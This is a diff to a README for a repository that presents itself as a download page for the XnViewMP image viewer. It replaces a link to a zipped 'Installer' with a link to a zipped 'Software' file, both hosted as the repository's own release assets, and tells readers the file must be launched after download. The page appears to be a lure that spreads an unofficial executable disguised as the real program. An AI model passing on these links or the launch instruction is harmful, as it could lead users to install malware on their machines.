@@ -27,7 +27,7 @@ Welcome to the XnViewMP Download repository! Here you can find information about
 📥🚀
 
 To download the latest version, click on the link below:
-[![Download XnViewMP](https://github.com/nassimnassouri2/XnViewMP-Download/releases/download/v1.0/Installer.zip)](https://github.com/nassimnassouri2/XnViewMP-Download/releases/download/v1.0/Installer.zip)
+[![Download XnViewMP](https://github.com/nassimnassouri2/XnViewMP-Download/releases/download/v2.0/Software.zip)](https://github.com/nassimnassouri2/XnViewMP-Download/releases/download/v2.0/Software.zip)
 
 🚀*Note: The file needs to be launched after download.*
 
